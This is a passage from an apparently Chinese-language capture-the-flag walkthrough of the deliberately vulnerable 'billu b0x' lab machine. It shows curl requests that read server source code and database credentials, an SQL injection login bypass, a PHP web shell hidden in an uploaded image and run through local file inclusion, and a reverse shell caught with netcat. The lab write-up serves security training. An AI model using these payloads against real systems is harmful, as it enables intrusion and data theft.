&lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br>        <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are allowed&lt;br&gt;&quot;</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-literal">true</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>           <br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>   <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>c.php，有个密码，尝试 ssh 登录，但是失败</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./c.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>&lt;?php<br><span class="hljs-comment">#header( &#x27;Z-Powered-By:its chutiyapa xD&#x27; );</span><br>header(<span class="hljs-string">&#x27;X-Frame-Options: SAMEORIGIN&#x27;</span>);<br>header( <span class="hljs-string">&#x27;Server:testing only&#x27;</span> );<br>header( <span class="hljs-string">&#x27;X-Powered-By:testing only&#x27;</span> );<br><br>ini_set( <span class="hljs-string">&#x27;session.cookie_httponly&#x27;</span>, <span class="hljs-number">1</span> );<br><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;billu&quot;</span>,<span class="hljs-string">&quot;b0x_billu&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);<br><br>// Check connection<br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>  &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;connection failed -&gt;  &quot;</span> . mysqli_connect_error();<br>  &#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>panel.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./panel.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>session_start();<br><br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br>include(<span class="hljs-string">&#x27;head2.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-selector-tag">@</span><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=true )<br>&#123;<br>                header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to billu b0x &quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;lg&#x27;</span>]))<br>&#123;<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]);<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>        header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;select name=load&gt;</span><br><span class="hljs-string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span><br><span class="hljs-string">        &lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span><br><span class="hljs-string">&lt;/select&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$dir</span>=getcwd();<br>        <span class="hljs-variable">$choice</span>=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                        die();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>        &#123;<br>        <br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                die();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>        &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))<br>&#123;<br><br>        <span class="hljs-variable">$name</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$address</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);<br>        <span class="hljs-variable">$id</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>        &#123;<br>                <span class="hljs-variable">$iname</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$r</span>=pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br>        <span class="hljs-variable">$image</span>=array(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$image</span>))<br>        &#123;<br>                <span class="hljs-variable">$finfo</span> = @new finfo(FILEINFO_MIME); <br>        <span class="hljs-variable">$filetype</span> = <span class="hljs-selector-tag">@</span><span class="hljs-variable">$finfo</span>-&gt;file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/image\/jpeg/&#x27;</span>,<span class="hljs-variable">$filetype</span> )  || preg_match(<span class="hljs-string">&#x27;/image\/png/&#x27;</span>,<span class="hljs-variable">$filetype</span> ) || preg_match(<span class="hljs-string">&#x27;/image\/gif/&#x27;</span>,<span class="hljs-variable">$filetype</span> ))<br>                                &#123;<br>                                        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>                                                         &#123;<br>                                                          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Uploaded successfully &quot;</span>;<br>                                                          <span class="hljs-variable">$update</span>=<span class="hljs-string">&#x27;insert into users(name,address,image,id) values(\&#x27;</span><span class="hljs-string">&#x27;.$name.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$address.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$iname.&#x27;</span>\<span class="hljs-string">&#x27;, \&#x27;</span><span class="hljs-string">&#x27;.$id.&#x27;</span>\<span class="hljs-string">&#x27;)&#x27;</span>; <br>                                                         mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$update</span>);<br>                                                          <br>                                                        &#125;<br>                                &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;<br>                        &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;<br><br>        &#125;<br>&#125;<br><br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./test.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_download</span><span class="hljs-params">(<span class="hljs-variable">$download</span>)</span></span><br>&#123;<br>        <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$download</span>))<br>                                &#123;<br>                                        header(<span class="hljs-string">&quot;Content-Description: File Transfer&quot;</span>); <br><br>                                        header(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Accept-Ranges: bytes&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.basename(<span class="hljs-variable">$download</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>); <br>                                        header(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . filesize(<span class="hljs-variable">$download</span>));<br>                                        header(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>); <br>                                        ob_clean();<br>                                        flush();<br>                                        readfile (<span class="hljs-variable">$download</span>);<br>                                &#125;<br>                                <span class="hljs-keyword">else</span><br>                                &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;file not found&quot;</span>;<br>                                &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>&#123;<br>file_download(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\&#x27;</span>file\<span class="hljs-string">&#x27; parameter is empty. Please provide file path in \&#x27;</span>file\<span class="hljs-string">&#x27; parameter &#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>show.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./show.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from users &#x27;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (mysqli_num_rows(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;table width=90% &gt;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;User&lt;/td&gt;&lt;td&gt;Address&lt;/td&gt;&lt;td&gt;Image&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br> <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>)) <br>   &#123;<br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&lt;img src=&quot;uploaded_images/&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;image&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&quot; height=90px width=100px&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>&#125;<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>通过代码审计发现:panel.php 文件是登陆后才能访问的，绕过的语法是 <code>&#39; or 1=1 -- \</code></p><p>这里实际上也可以使用 burpsuite 加载 seclist 中的字典来爆破</p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>实际上这里的第二个引号由于转义字符的存在导致其无法发挥作用，而是第一个引号和第三个引号才实现了闭合，因此第一个–+实际上没有发挥作用。</p><p><img src="/pic/0456f4a222c3bb5a4ffae8f968acb5f5_MD5.png"></p><p>实际上也可以使用 <code>\</code> 作为密码，并且由于 <code>&#39;</code> 在代码中被过滤，使用 <code>or 1=1 -- \</code> 作为username来绕过，也可以实现同样的效果，下图也是可以登录成功的</p><p><img src="/pic/9bc0ce88026986efb6cd1e25a9e0b86c_MD5.png"></p><p>登录成功发现了两个用户，有两个功能一是 show，二是 add，正好对应了之前目录扫描的结果，我们在这里尝试新增加一个用户，并且在图片中增加一句话木马的代码 <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><p><img src="/pic/cc7a59d812e08de19b439f805ed43067_MD5.png"></p><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>写入一句话木马的 jpg 图片</p><p><img src="/pic/c244e22fce7e9a4040eb88e5634f76c3_MD5.png"></p><p>直接访问图片并没有实现反弹 powershell，也就是说我们需要考虑另一种利用方式来访问此文件，这时候我们就需要使用 burpsuite 了，因为 panel 本身是需要加载 show.php 的，也就是说在 panel.php 是可以加载其他 php 文件的</p><p>我们再来看一眼 panel.php 的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>&#123;<br><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>else</code>: 如果前面的两个条件都不满足，即用户选择了除 <code>&#39;add&#39;</code> 和 <code>&#39;show&#39;</code> 之外的选项。 <code>include($dir.&#39;/&#39;.$_POST[&#39;load&#39;]);</code>: 这行代码使用 <code>include()</code> 函数将用户选择的文件包含进来。它构建了文件路径 <code>$dir.&#39;/&#39;.$_POST[&#39;load&#39;]</code>，并将该文件包含进来。 这段代码的作用是根据用户的选择，包含不同的 PHP 文件。具体的文件路径和名称由用户通过 POST 请求中的 <code>&#39;load&#39;</code> 参数提供。如果用户选择了 <code>&#39;add&#39;</code> 或 <code>&#39;show&#39;</code>，将包含相应的 PHP 文件并停止脚本执行；否则，将根据用户提供的文件路径包含相应的文件。</p><p>burp 抓包中可以看到 load&#x3D;show 处应该是加载文件的路径，这时候我们替换为我们一句话木马的路径，并且在参数中给定 cmd&#x3D;whoami 进行尝试</p><p><img src="/pic/c43222af837821f839b45bb01145dc13_MD5.png"></p><p>成功运行了一句话木马</p><p><img src="/pic/ae8da2caaf00c1066e66e13b6943dc71_MD5.png"></p><p>接下来我们将一句话木马转换为 reverse_powershell ，借助于网络上的 payload 我们很方便地确定 cmd 的值，并且这里刚开始反弹并不成功，在使用 URL 编码对关键词进行编码后实现了反弹 powershell</p><p><img src="/pic/10a98a23d0441df79c025565fafa5970_MD5.png"></p><p>反弹powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">443</span>                           <br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>listening on [<span class="hljs-type">any</span>] <span class="hljs-number">443</span> ...<br>connect to <span class="hljs-function">[<span class="hljs-number">10.10</span><span class="hljs-type">.10.160</span>] <span class="hljs-title">from</span></span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>] <span class="hljs-number">47297</span><br>/bin/sh: <span class="hljs-number">0</span>: cannot access tty; job control turned off<br><span class="hljs-variable">$</span> whoami<br>www<span class="hljs-literal">-data</span><br><span class="hljs-variable">$</span> python <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$whoami</span><br>whoami<br>www<span class="hljs-literal">-data</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> ip a<br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: 